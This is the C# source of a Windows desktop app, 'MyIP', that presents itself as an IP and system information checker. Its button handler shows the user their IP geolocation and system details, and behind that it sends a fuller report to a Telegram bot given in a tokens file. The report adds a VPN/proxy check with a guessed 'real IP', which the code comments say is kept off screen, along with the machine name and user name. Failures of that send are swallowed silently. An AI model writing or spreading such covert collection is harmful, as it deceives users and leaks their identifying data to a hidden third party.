using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using Newtonsoft.Json.Linq;

namespace MyIP
{
    public partial class MainWindow : Window
    {
        // Чтение токенов из JSON-файла
        private readonly JObject tokens = JObject.Parse(File.ReadAllText("tokens.json"));

        private readonly string IpInfoToken;
        private readonly string TelegramBotToken;
        private readonly string TelegramChatId;

        public MainWindow()
        {
            InitializeComponent();

            // Инициализация токенов
            IpInfoToken = tokens["IPINFO_TOKEN"]?.ToString();
            TelegramBotToken = tokens["TELEGRAM_BOT_TOKEN"]?.ToString();
            TelegramChatId = tokens["TELEGRAM_CHAT_ID"]?.ToString();

            if (string.IsNullOrEmpty(IpInfoToken) || string.IsNullOrEmpty(TelegramBotToken) || string.IsNullOrEmpty(TelegramChatId))
            {
                Application.Current.Shutdown();
            }
        }

        private async void GetIpDetailsButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string ipDetails = await GetIpDetailsAsync();
                string currentIp = ExtractIpFromDetails(ipDetails);
                string dnsLeakInfo = await CheckDnsLeakAsync(currentIp);
                string systemDetails = GetSystemDetails();

                // Отображаем только IP и системные данные
                string visibleDetails = $"{ipDetails}\n\n{systemDetails}";
                InfoTextBox.Text = visibleDetails;

                // Полная информация для отправки в Telegram
                string fullDetails = $"{ipDetails}\n\nDNS-утечка:\n{dnsLeakInfo}\n\n{systemDetails}";

                if (!string.IsNullOrEmpty(fullDetails))
                {
                    await SendToTelegramAsync(fullDetails);
                }
            }
            catch (Exception ex)
            {
                LogError(ex.Message);
            }
        }


        private async Task<string> GetIpDetailsAsync()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string url = $"https://ipinfo.io/json?token={IpInfoToken}";
                    HttpResponseMessage response = await client.GetAsync(url).ConfigureAwait(false);

                    response.EnsureSuccessStatusCode();

                    string json = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                    JObject data = JObject.Parse(json);

                    string ip = data["ip"]?.ToString();
                    string city = data["city"]?.ToString();
                    string region = data["region"]?.ToString();
                    string country = data["country"]?.ToString();
                    string postal = data["postal"]?.ToString();
                    string org = data["org"]?.ToString();
                    string timezone = data["timezone"]?.ToString();
                    string loc = data["loc"]?.ToString();
                    string hostname = data["hostname"]?.ToString();

                    return $"IP: {ip}\n" +
                           $"Город: {city}\n" +
                           $"Регион: {region}\n" +
                           $"Страна: {country}\n" +
                           $"Почтовый индекс: {postal}\n" +
                           $"Организация: {org}\n" +
                           $"Временная зона: {timezone}\n" +
                           $"Локация: {loc} (Широта, Долгота)";
                }
            }
            catch (HttpRequestException ex)
            {
                LogError($"HTTP ошибка: {ex.Message}");
                return "Не удалось получить информацию об IP. Попробуйте отключить VPN или Прокси.";
            }
        }

        private async Task<string> CheckDnsLeakAsync(string ip)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string url = $"https://proxycheck.io/v2/{ip}?vpn=1&asn=1&risk=1";
                    HttpResponseMessage response = await client.GetAsync(url).ConfigureAwait(false);

                    response.EnsureSuccessStatusCode();

                    string json = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                    JObject data = JObject.Parse(json);

                    string isVpn = data[ip]?["proxy"]?.ToString();
                    string provider = data[ip]?["provider"]?.ToString();
                    string asn = data[ip]?["asn"]?.ToString();
                    string realIp = data[ip]?["real"]?.ToString();

                    if (isVpn == "yes")
                    {
                        string result = $"Обнаружено использование VPN или прокси!\nASN: {asn}\nПровайдер: {provider}";

                        if (!string.IsNullOrEmpty(realIp))
                        {
                            result += $"\n**Предполагаемый реальный IP:** {realIp}";
                        }
                        else
                        {
                            result += "\nПредполагаемый реальный IP: не найден.";
                        }

                        return result;
                    }
                    else
                    {
                        return "VPN или прокси не обнаружены.";
                    }
                }
            }
            catch (HttpRequestException ex)
            {
                LogError($"Ошибка при проверке DNS-утечки: {ex.Message}");
                return "Не удалось проверить утечку DNS.";
            }
        }


        private string ExtractIpFromDetails(string ipDetails)
        {
            try
            {
                string[] lines = ipDetails.Split('\n');
                foreach (var line in lines)
                {
                    if (line.StartsWith("IP:"))
                    {
                        return line.Replace("IP:", "").Trim();
                    }
                }
                return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        private string GetSystemDetails()
        {
            try
            {
                string osVersion = RuntimeInformation.OSDescription;
                string osArchitecture = RuntimeInformation.OSArchitecture.ToString();
                string processArchitecture = RuntimeInformation.ProcessArchitecture.ToString();
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string systemDirectory = Environment.SystemDirectory;
                string processorCount = Environment.ProcessorCount.ToString();
                string dotNetVersion = Environment.Version.ToString();

                return $"Информация о системе:\n" +
                       $"Имя компьютера: {machineName}\n" +
                       $"Имя пользователя: {userName}\n" +
                       $"Операционная система: {osVersion}\n" +
                       $"Архитектура ОС: {osArchitecture}\n" +
                       $"Архитектура процесса: {processArchitecture}\n" +
                       $"Каталог системы: {systemDirectory}\n" +
                       $"Количество процессоров: {processorCount}\n" +
                       $".NET версия: {dotNetVersion}";
            }
            catch (Exception ex)
            {
                LogError($"Ошибка при сборе информации о системе: {ex.Message}");
                return "Не удалось получить информацию о системе.";
            }
        }

        private async Task SendToTelegramAsync(string details)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string message = $"Информация о IP:\n{details}";
                    string telegramApiUrl = $"https://api.telegram.org/bot{TelegramBotToken}/sendMessage";

                    string payload = $"{{\"chat_id\":\"{TelegramChatId}\",\"text\":\"{message}\"}}";
                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/json");

                    HttpResponseMessage response = await client.PostAsync(telegramApiUrl, content).ConfigureAwait(false);
                    response.EnsureSuccessStatusCode();

                }
            }
            catch (HttpRequestException)
            {
            }
        }

        private void LogError(string message)
        {
            string logFilePath = "error.log";
            File.AppendAllText(logFilePath, $"{DateTime.Now}: {message}\n");
            MessageBox.Show("Произошла ошибка.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }
}
